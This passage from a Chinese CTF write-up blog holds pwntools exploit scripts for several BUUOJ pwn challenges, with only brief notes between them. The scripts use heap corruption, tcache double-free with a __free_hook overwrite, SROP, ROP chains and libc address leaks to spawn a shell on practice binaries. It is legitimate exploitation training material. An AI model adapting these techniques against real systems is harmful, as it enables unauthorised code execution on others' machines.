&apos;,text)</span><br><span class="line">def Free(Index):</span><br><span class="line">	p.sendlineafter(&apos;Action: &apos;,&apos;1&apos;)</span><br><span class="line">	p.sendlineafter(&apos;index: &apos;,str(Index))</span><br><span class="line">def Dump(Index):</span><br><span class="line">	p.sendlineafter(&apos;Action: &apos;,&apos;2&apos;)</span><br><span class="line">	p.sendlineafter(&apos;index: &apos;,str(Index))</span><br><span class="line"></span><br><span class="line">Allocate(0x80,&apos;\xee&apos;*4,0x80,&apos;\xee&apos;*4)</span><br><span class="line">Allocate(0x10,&apos;\x11&apos;*4,0x10,&apos;\x22&apos;*4)</span><br><span class="line">Allocate(0x80,&apos;\x11&apos;*4,0x80,&apos;\x22&apos;*4)</span><br><span class="line">Allocate(0x10,&apos;/bin/sh\x00&apos;,0x10,&apos;/bin/sh\x00&apos;)</span><br><span class="line">Free(0)</span><br><span class="line">payload=&apos;\x11&apos;*0x108+p32(0)+p32(0x19)+&apos;j&apos;*8+p64(0)+p32(0)+p32(0x89)+p32(free_got)</span><br><span class="line">Allocate(0x100,&apos;\x00&apos;,0x200,payload)</span><br><span class="line">Dump(1)</span><br><span class="line">p.recvuntil(&apos;description: &apos;)</span><br><span class="line">free_addr=u32(p.recv(4))</span><br><span class="line">print &quot;free_addr=&gt;&quot;,hex(free_addr)</span><br><span class="line">libc=LibcSearcher(&apos;free&apos;,free_addr)</span><br><span class="line">libcdata_addr=free_addr-libc.dump(&apos;free&apos;)</span><br><span class="line">print &quot;libcdata_addr=&gt;&quot;,hex(libcdata_addr)</span><br><span class="line">system_addr=libcdata_addr+libc.dump(&apos;system&apos;)</span><br><span class="line">print &quot;system_addr=&gt;&quot;,hex(system_addr)</span><br><span class="line">Update(1,0x4,p32(system_addr))</span><br><span class="line"></span><br><span class="line">Free(3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h3><p>SROP  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#p=process(&apos;./ciscn&apos;)</span><br><span class="line">p=remote(&apos;node3.buuoj.cn&apos;,27381)</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line">elf = ELF(&quot;ciscn&quot;)</span><br><span class="line">main_addr=0x40051D</span><br><span class="line"></span><br><span class="line">mov_eax_0xf_ret=0x4004DA</span><br><span class="line">syscall_ret=0x400517</span><br><span class="line">read_write_ret = 0x4004F1</span><br><span class="line">payload=&apos;/bin/sh\x00&apos;.ljust(16,&apos;A&apos;)+p64(read_write_ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&apos;AAAAAAAA&apos;)</span><br><span class="line">stack_addr=u64(p.recv()[16:22].ljust(8,&apos;\x00&apos;))</span><br><span class="line">print &quot;stack_addr=&gt;&quot;,hex(stack_addr)</span><br><span class="line"></span><br><span class="line">binsh = stack_addr - 0x118</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = binsh</span><br><span class="line">#sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line">sigframe.rsi = 0</span><br><span class="line">sigframe.rdx = 0</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">payload=&apos;a&apos;*16+p64(mov_eax_0xf_ret)+p64(syscall_ret)+str(sigframe)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p=process(&apos;./babyrop&apos;)</span><br><span class="line">#p=remote(&apos;node3.buuoj.cn&apos;,25812)</span><br><span class="line">elf=ELF(&apos;./babyrop&apos;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;What&apos;s your name? &quot;)</span><br><span class="line">main_addr=0x4005D6</span><br><span class="line">payload=&apos;A&apos;*16+p64(0)+p64(0x400683)+p64(0x601048)+p64(0x4005e3)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">#print p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ciscn-2019-final-3"><a href="#ciscn-2019-final-3" class="headerlink" title="ciscn_2019_final_3"></a>ciscn_2019_final_3</h3><p>从tcachebins逃出去，才能泄露，<br>tcachebins最大为0x500，合并堆块让tcachebins大于0x500  、<br>然后改写<code>__free_hook_</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p=process(&apos;./ciscn_final_3&apos;)</span><br><span class="line">#p=remote(&apos;node3.buuoj.cn&apos;,29871)</span><br><span class="line">#context.log_level=&quot;debug&quot;</span><br><span class="line">elf=ELF(&apos;./ciscn_final_3&apos;)</span><br><span class="line">free_got=elf.got[&apos;free&apos;]</span><br><span class="line">print &quot;free_got=&gt;&quot;,hex(free_got)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">def add(Index,length,size):</span><br><span class="line">	p.sendlineafter(&apos;choice &gt; &apos;,&apos;1&apos;)</span><br><span class="line">	p.sendlineafter(&apos;input the index\n&apos;,str(Index))</span><br><span class="line">	p.sendlineafter(&apos;input the size\n&apos;,str(length))</span><br><span class="line">	p.sendafter(&apos;now you can write something\n&apos;,size)</span><br><span class="line">def free(Index):</span><br><span class="line">	p.sendlineafter(&apos;choice &gt; &apos;,&apos;2&apos;)</span><br><span class="line">	p.sendlineafter(&apos;input the index\n&apos;,str(Index))</span><br><span class="line">add(0,0x78,&apos;\x00&apos;*0x78)</span><br><span class="line"></span><br><span class="line">add(1,0x78,p64(0x78))</span><br><span class="line">p.recvuntil(&apos;gift :0x&apos;)</span><br><span class="line">addr=int(p.recv(12),16)</span><br><span class="line">add(2,0x78,&apos;b&apos;*0x78)</span><br><span class="line">add(3,0x78,&apos;x&apos;)</span><br><span class="line">add(4,0x78,&apos;\x33&apos; * 0x78)</span><br><span class="line">add(5,0x78,&apos;\x44&apos; * 0x78)</span><br><span class="line">add(6,0x78,&apos;\x55&apos; * 0x78)</span><br><span class="line">add(7,0x78,&apos;\x66&apos; * 0x78)</span><br><span class="line">add(8,0x78,&apos;\x77&apos; * 0x78)</span><br><span class="line">add(9,0x78,&apos;/bin/sh\x00&apos;)</span><br><span class="line">add(10,0x78,&apos;aa&apos;)</span><br><span class="line">add(11,0x78,&apos;aa&apos;)</span><br><span class="line">free(0)</span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">print &quot;addr&quot;,hex(addr)</span><br><span class="line">add(12,0x78,p64(addr-0x10))</span><br><span class="line">add(13,0x78,p64(addr-0x10))</span><br><span class="line">add(14,0x78,p64(0)+p64(0x481))</span><br><span class="line">p.recvuntil(&apos;gift :0x&apos;)</span><br><span class="line">addr2=int(p.recv(12),16)</span><br><span class="line">print &quot;addr2=&gt;&quot;,hex(addr2)</span><br><span class="line">free(1)</span><br><span class="line">add(15,0x68,&apos;aa&apos;)</span><br><span class="line">free(15)</span><br><span class="line">free(15)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(16,0x68,p64(addr2+0x80))</span><br><span class="line">add(17,0x68,p64(addr2+0x80))</span><br><span class="line">add(18,0x68,&apos;\x00&apos;)</span><br><span class="line">add(19,0x68,&apos;\x00&apos;)</span><br><span class="line">p.recvuntil(&apos;gift :0x&apos;)</span><br><span class="line">addr3=int(p.recv(12),16)</span><br><span class="line">libcdata_addr=addr3-0x3EBCA0</span><br><span class="line">system_addr=libcdata_addr+libc.symbols[&apos;system&apos;]</span><br><span class="line">__free_hook=libcdata_addr+libc.symbols[&apos;__free_hook&apos;]</span><br><span class="line">print &quot;__free_hook=&gt;&quot;,hex(__free_hook)</span><br><span class="line">print &quot;libcdata_addr=&gt;&quot;,hex(libcdata_addr)</span><br><span class="line">print &quot;addr3=&gt;&quot;,hex(addr3)</span><br><span class="line">add(20,0x38,p64(0xdeadbeef))</span><br><span class="line">free(20)</span><br><span class="line">free(20)</span><br><span class="line">add(21,0x38,p64(__free_hook))</span><br><span class="line">add(22,0x38,p64(__free_hook))</span><br><span class="line">add(23,0x38,p64(system_addr))</span><br><span class="line">free(9)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h3><p>典型泄露地址然后getshell  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line">p=process(&apos;./pwn_2_sctf_2016&apos;)</span><br><span class="line">#p=remote(&apos;buuoj.cn&apos;,29982)</span><br><span class="line">elf=ELF(&apos;./pwn_2_sctf_2016&apos;)</span><br><span class="line">printf_got=elf.got[&apos;printf&apos;]</span><br><span class="line">printf_plt=elf.plt[&apos;printf&apos;]</span><br><span class="line">p.sendlineafter(&apos;read? &apos;,&apos;-12&apos;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.recvuntil(&apos;bytes of data!\n&apos;)</span><br><span class="line">main_addr=0x08048535</span><br><span class="line">V5_0=0x080483D0</span><br><span class="line">payload=&apos;A&apos;*0x2C+&apos;A&apos;*4+p32(printf_plt)+p32(V5_0)+p32(0x80486F8)+p32(printf_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&apos;said: &apos;)</span><br><span class="line">p.recvuntil(&apos;said: &apos;)</span><br><span class="line">printf_addr=u32(p.recv(4))</span><br><span class="line">print &quot;printf_addr=&gt;&quot;,hex(printf_addr)</span><br><span class="line">libc=LibcSearcher(&apos;printf&apos;,printf_addr)</span><br><span class="line">libcdata_addr=printf_addr-libc.dump(&apos;printf&apos;)</span><br><span class="line">system_addr=libcdata_addr+libc.dump(&apos;system&apos;)</span><br><span class="line">bin_sh_addr=libcdata_addr+libc.dump(&apos;str_bin_sh&apos;)</span><br><span class="line">p.sendlineafter(&apos;read? &apos;,&apos;-12&apos;)</span><br><span class="line">p.recvuntil(&apos;bytes of data!\n&apos;)</span><br><span class="line">payload=&apos;A&apos;*0x2C+&apos;A&apos;*4+p32(system_addr)+p32(V5_0)+p32(bin_sh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h3><p>写个shellcode就行，  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#p=process(&apos;./ez_pz_hackover&apos;)</span><br><span class="line">p=remote(&apos;node3.buuoj.cn&apos;,25160)</span><br><span class="line">p.recvuntil(&apos;0x&apos;)</span><br><span class="line">stack_addr=int(p.recv(8),16)+8-0x24</span><br><span class="line">print &quot;stack_addr=&gt;&quot;,hex(stack_addr)</span><br><span class="line">p.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">print len(shellcode)</span><br><span class="line">payload=&apos;crashme\x00&apos;+&apos;AAAAAAAAAA&apos;+&apos;A&apos;*8+p32(stack_addr)+shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h3><p>还是说system(‘/bin/sh’)打不过去，还是用execve(‘/bin/sh’,0,0)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line">#p=remote(&apos;node3.buuoj.cn&apos;,28049)</span><br><span class="line">p=process(&apos;./ciscn&apos;)</span><br><span class="line">elf=ELF(&apos;./ciscn&apos;)</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line">libc=ELF(&apos;libc.so.6&apos;)</span><br><span class="line">pop_rdi_ret=0x0400713</span><br><span class="line">pop_rsi_r15_ret=0x400711</span><br><span class="line">main_addr=0x0400636</span><br><span class="line">bss_addr=0x00601080	</span><br><span class="line">puts_plt=elf.plt[&apos;puts&apos;]</span><br><span class="line">__libc_start_main=elf.got[&apos;__libc_start_main&apos;]</span><br><span class="line">p.recvuntil(&apos;tell me your name\n&apos;)</span><br><span class="line"></span><br><span class="line">p.sendline(&apos;a&apos;)</span><br><span class="line">p.recvuntil(&apos;say to me?\n&apos;)</span><br><span class="line">payload=&apos;A&apos;*40+p64(pop_rdi_ret)+p64(__libc_start_main)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">__libc_startaddr=u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">#libc=LibcSearcher(&apos;__libc_start_main&apos;,__libc_startaddr)</span><br><span class="line">libcdata_addr=__libc_startaddr-libc.symbols[&apos;__libc_start_main&apos;]</span><br><span class="line">print &quot;libcdata_addr=&gt;&quot;,hex(libcdata_addr)</span><br><span class="line">system_addr=libcdata_addr+libc.symbols[&apos;system&apos;]</span><br><span class="line">exeace_addr=libcdata_addr+libc.symbols[&apos;execve&apos;]</span><br><span class="line">binsh = libcdata_addr +libc.search(&quot;/bin/sh\x00&quot;).next()</span><br><span class="line">print &quot;system_addr=&gt;&quot;,hex(system_addr)</span><br><span class="line">p.recvuntil(&apos;tell me your name\n&apos;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(&apos;/bin/sh\x00&apos;)</span><br><span class="line">p.recvuntil(&apos;say to me?\n&apos;)</span><br><span class="line">#payload=&apos;a&apos;*40+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)</span><br><span class="line">payload=&apos;B&apos;*40+p64(pop_rdi_ret)+p64(binsh)+p64(pop_rsi_r15_ret)+p64(0)+p64(0)+p64(exeace_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h3><p>跟上面思路差不多</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line">p=remote(&apos;node3.buuoj.cn&apos;,29316)</span><br><span class="line">#p=process(&apos;./ciscn&apos;)</span><br><span class="line">elf=ELF(&apos;./ciscn&apos;)</span><br><span class="line">__libc_start_main=elf.got[&apos;__libc_start_main&apos;]</span><br><span class="line">system_addr=elf.plt[&apos;system&apos;]</span><br><span class="line">main_addr=0x8048722 </span><br><span class="line">pop2_ret=0x0804871f</span><br><span class="line">p.sendlineafter(&apos;password:&apos;,&apos;administrator&apos;)</span><br><span class="line">p.sendlineafter(&apos;:&apos;,&apos;1&apos;)</span><br><span class="line"></span><br><span class="line">payload=&apos;A&apos;*76+p32(0x08048490)+p32(main_addr)+p32(0x80489F5)+p32(__libc_start_main)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&apos;info:&apos;,payload)</span><br><span class="line">p.sendlineafter(&apos;:&apos;,&apos;4&apos;)</span><br><span class="line">p.recvuntil(&apos;The flag is your log:&apos;)</span><br><span class="line">p.recvuntil(&apos;The flag is your log:&apos;)</span><br><span class="line">__libc_start_addr=u32(p.recv(4))</span><br><span class="line">libc=LibcSearcher(&apos;__libc_start_main&apos;,__libc_start_addr)</span><br><span class="line">libcdata_addr=__libc_start_addr-libc.dump(&apos;__libc_start_main&apos;)</span><br><span class="line">print &quot;libcdata_addr=&gt;&quot;,hex(libcdata_addr)</span><br><span class="line"></span><br><span class="line">binsh_addr=libcdata_addr+libc.dump(&apos;str_bin_sh&apos;)</span><br><span class="line">print &quot;binsh_addr=&gt;&quot;,hex(binsh_addr)</span><br><span class="line">p.sendlineafter(&apos;password:&apos;,&apos;administrator&apos;)</span><br><span class="line">p.sendlineafter(&apos;:&apos;,&apos;1&apos;)</span><br><span class="line">payload=&apos;A&apos;*76+p32(system_addr)+p32(main_addr)+p32(binsh_addr)+p32(__libc_start_main)</span><br><span class="line">p.sendlineafter(&apos;info:&apos;,payload)</span><br><span class="line">p.sendlineafter(&apos;:&apos;,&apos;4&apos;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p=process(&apos;./babyrop2&apos;)</span><br><span class="line">elf=ELF(&apos;./babyrop2&apos;)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">printf_got=elf.plt[&apos;printf&apos;]</span><br><span class="line">__libc_start_main=elf.got[&apos;__libc_start_main&apos;]</span><br><span class="line">pop_rdi_ret=0x0400733</span><br><span class="line">pop_rsi_p15_ret=0x400731</span><br><span class="line">main_addr=0x0400540</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload=&apos;A&apos;*40+p64(pop_rdi_ret)+p64(0x400770)+p64(pop_rsi_p15_ret)+p64(__libc_start_main)+p64(0)+p64(printf_got)+p64(main_addr)+p64(0)</span><br><span class="line">p.sendlineafter(&apos;name? &apos;,payload)</span><br><span class="line">p.recvuntil(&apos;again, &apos;)</span><br><span class="line">p.recvuntil(&apos;again, &apos;)</span><br><span class="line">__libc_start_addr=u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">print &quot;__libc_start_addr=&gt;&quot;,hex(__libc_start_addr)</span><br><span class="line">libcdata_addr=__libc_start_addr-libc.symbols[&apos;__libc_start_main&apos;]</span><br><span class="line">system_addr=libcdata_addr+libc.symbols[&apos;system&apos;]</span><br><span class="line"></span><br><span class="line">binsh_addr=libcdata_addr+libc.search(&quot;/bin/sh\x00&quot;).next()</span><br><span class="line">print &quot;libcdata_addr=&gt;&quot;,hex(libcdata_addr)</span><br><span class="line">print &quot;system_addr=&gt;&quot;,hex(system_addr)</span><br><span class="line">print &quot;binsh_addr=&gt;&quot;,hex(binsh_addr)</span><br><span class="line">payload=&apos;A&apos;*40+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">p.sendlineafter(&apos;name? &apos;,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p=remote(&apos;node3.buuoj.cn&apos;,25311)</span><br><span class="line">#p=process(&apos;./ciscn&apos;)</span><br><span class="line">elf=ELF(&apos;./ciscn&apos;)</span><br><span class="line">system_addr=elf.plt[&apos;system&apos;]</span><br><span class="line">p.recvuntil(&quot;name?&quot;)</span><br><span class="line"></span><br><span class="line">leave_ret=0x080484b8</span><br><span class="line">payload=&apos;A&apos;*0x27</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">stack_addr=u32(p.recv(4))-0x38</span><br><span class="line">print &quot;stack_addr=&gt;&quot;,hex(stack_addr)</span><br><span class="line">p.recvline()</span><br><span class="line">payload2=p32(stack_addr+30)+p32(system_addr)+p32(0)+p32(stack_addr+0x10)+&apos;/bin/sh\x00&apos;+&apos;B&apos;*0x10+p32(stack_addr)+p32(leave_ret)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="roarctf-2019-easy-pwn"><a href="#roarctf-2019-easy-pwn" class="headerlink" title="roarctf_2019_easy_pwn"></a>roarctf_2019_easy_pwn</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line">#context.log_level=&quot;debug&quot;</span><br><span class="line">p=process(&apos;./roar&apos;)</span><br><span class="line">#p=remote(&apos;node3.buuoj.cn&apos;,27009)</span><br><span class="line">def add(size):</span><br><span class="line">	p.sendlineafter(&apos;choice: &apos;,&apos;1&apos;)</span><br><span class="line">	p.sendlineafter(&apos;size: &apos;,str(size))</span><br><span class="line">	p.recvuntil(&apos;ticket is &apos;)</span><br><span class="line">	return p.recv(1)</span><br><span class="line">def Write(index,size,content):</span><br><span class="line">	p.sendlineafter(&apos;choice: &apos;,&apos;2&apos;)</span><br><span class="line">	p.sendlineafter(&apos;index: &apos;,str(index))</span><br><span class="line">	p.sendlineafter(&apos;size: &apos;,str(size))</span><br><span class="line">	p.sendafter(&apos;content: &apos;,content)</span><br><span class="line">def free(index):</span><br><span class="line">	p.sendlineafter(&apos;choice: &apos;,&apos;3&apos;)</span><br><span class="line">	